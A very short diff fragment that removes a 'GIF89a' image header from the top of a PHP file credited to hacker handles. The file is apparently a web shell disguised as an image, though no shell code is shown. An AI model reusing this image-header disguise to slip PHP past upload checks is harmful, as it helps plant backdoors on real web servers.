@@ -1,4 +1,3 @@
-GIF89a1;
 <?php
 /*
             By: MR.x0verKILL / JulsHaxoR
